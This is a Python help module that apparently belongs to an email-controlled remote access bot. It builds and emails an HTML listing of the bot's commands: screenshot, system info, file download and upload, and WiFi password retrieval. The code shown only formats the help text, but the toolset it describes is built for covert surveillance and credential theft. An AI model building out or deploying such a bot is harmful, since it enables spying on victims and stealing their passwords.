import importlib


from mods.screenshot import screenshot
from mods.systeminfo import systeminfo
from bot.mods.download import urlDownload
from bot.mods.upload import UrlUploader
from mods.wifi import WifiPasswordRetriever

from externals.templates import helper_template
class Helper:
    def __init__(self):
        self.info = ""

    def smallHelpTemplate(self,heading,info,command,args_info):
        template = f"""
<h2>{heading}</h2>
<p class="info">{info}</p>
<div class="command-structure">
    <p><strong>Command Structure-</strong> {command}</p>
    <div class="args">
        {args_info}
        
    </div>
</div>
"""
        return template


    def helpfunctions(self):
        self.info += self.smallHelpTemplate(
            heading="Help",
            info="Gives a helping hand Know about tool better",
            command=":help",
            args_info="<p><strong>args1:</strong> No arguments</p>"
        )
        

        listOfClasses = [screenshot, systeminfo, urlDownload, UrlUploader, WifiPasswordRetriever]
        for classes in listOfClasses:
            Class = classes()
            args_info = ""
            if Class.args == []:
                args_info += "<p><strong>args:</strong> No Arguments</p>"
            else:
                for arg in Class.args:
                    arg = arg.split(":")
                    args_info += f"<p><strong>{arg[0]}-</strong> {arg[1]}</p>"

            self.info += self.smallHelpTemplate(
                heading=Class.name,
                info=Class.info,
                command=Class.command,
                args_info= args_info
            )


        return helper_template(self.info)
    
    def run(self,EmailHandler,msgId):
        EmailHandler.send_email(
            message = self.helpfunctions(),
            msgId=msgId,
            reply=True
        )

if __name__ == "__main__":
    help = Helper()
    print(help.helpfunctions())
    


        
        

    

